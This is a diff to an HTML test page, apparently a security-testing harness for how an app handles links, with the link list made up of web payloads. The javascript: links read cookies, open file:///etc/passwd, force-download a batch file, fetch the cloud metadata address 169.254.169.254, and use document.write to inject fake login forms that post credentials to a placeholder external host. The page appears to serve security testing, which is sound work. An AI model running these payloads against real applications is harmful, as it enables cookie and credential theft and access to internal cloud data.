@@ -1,21 +1,22 @@
 <h1><a href="javascript:alert(document.domain)">Domain</a></h1>
 <h1><a href="javascript:alert(document.cookie)">Cookie</a></h1>
 <h1><a href="https://nccgroup.com">Normal URL</a></h1>
-<h1><a href="file:///etc/passwd">File URL</a></h1>
+<h1><a href="file:///etc/passwd">File URL 1</a></h1>
+<h1><a href="file:///etc/passwd">File URL 2</a></h1>
+<h1><a href="invalid:///etc/passwd">Invalid URL</a></h1>
+<h1><a href="javascript:location='file:///etc/passwd'">File URL via JavaScript</a></h1>
 <h1><a href="data:text/plain,powershell" download="benign.bat">Data URL</a></h1>
 <h1><a href="javascript:var a=document.createElement('a');a.setAttribute('download','benign.bat');a.href='/files/benign.bat';a.click();">Download remote file</a></h1>
 <h1><a href="javascript:var b=document.createElement('a');b.setAttribute('download','benign.bat');b.href='data:text/plain,powershell';b.click();">Download local content</a></h1>
 <h1><a href="javascript:fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text()).then(d=>alert(d)).catch(e=>alert(e));">169.254.169.254</a></h1>
+<h1><a href="javascript:document.write('<div style=\'transform:translate(-50%,-50%);position:fixed;top:50%;left:50%;\'><form method=\'POST\' action=\'https://i.really.hope.this.domain.doesnt.exist/login\'><h1>Log In</h1><h1><input type=\'text\' name=\'u\' placeholder=\'Username\'></h1><h1><input type=\'password\' name=\'p\' placeholder=\'Password\'></h1><h1><input type=\'submit\'></h1></form></div>')">Phishing 1</a></h1>
+<h1><a href="javascript:location='javascript:document.write(\'<div style=\'transform:translate(-50%,-50%);position:fixed;top:50%;left:50%;\'><form method=\'POST\' action=\'https://i.really.hope.this.domain.doesnt.exist/login\'><h1>Log In</h1><h1><input type=\'text\' name=\'u\' placeholder=\'Username\'></h1><h1><input type=\'password\' name=\'p\' placeholder=\'Password\'></h1><h1><input type=\'submit\'></h1></form></div>\')'">Phishing 2</a></h1>
+<h1><a href="javascript:location='javascript:document.write(\'<div style=\'transform:translate(-50%,-50%);position:fixed;top:50%;left:50%;\'><h1><a href=\'data:text/plain,powershell\' download=\'benign.cmd\'>Download a file</a></h1><h1><a href=\'javascript:alert(document.domain)\'>Check domain again</a></h1></div>\')'">Phishing 3</a></h1>
 
-<form action="/login" method="POST">
-  <input name="u" placeholder="Username" type="text">
-  <input name="p" placeholder="Password" type="password">
-  <input type="submit">
-</form>
+<p id="sw"></p>
 
-<br>
-
-<form action="/f" method="POST">
-  <input name="f" type="file">
-  <input type="submit">
-</form>
+<script>
+navigator.serviceWorker.register('/sw.js').then(r => {
+    document.getElementById('sw').textContent = `Service Worker registered! Scope: ${r.scope}`
+})
+</script>
